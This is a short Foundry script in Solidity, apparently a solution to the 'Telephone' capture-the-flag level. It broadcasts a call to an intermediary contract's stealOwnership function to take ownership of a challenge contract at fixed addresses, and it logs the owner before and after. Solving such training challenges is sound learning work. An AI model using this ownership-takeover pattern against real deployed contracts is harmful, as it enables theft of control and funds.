// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../lib/forge-std/src//Script.sol";
import {Telephone} from "../src/L5__Telephone.sol";
import {L5_Caller__Telephone} from "../src/L5_Caller__Telephone.sol";

// Claim ownership of the contract below to complete this level.

contract L5_Solution__Telephone is Script {
    Telephone public telephone =
        Telephone(0x1d092Ab0beDb5e32920f7b1D16C4d6036899D7CC);
    L5_Caller__Telephone public telephone_caller =
        L5_Caller__Telephone(0x2f7048518221DAD29Be98006c45CfBf95E764Af3);

    function run() public {
        console.logAddress(telephone.owner());

        address _robberAccount = vm.envAddress("ACCOUNT");
        vm.broadcast();

        telephone_caller.stealOwnership(_robberAccount);

        console.logAddress(telephone.owner());
    }
}
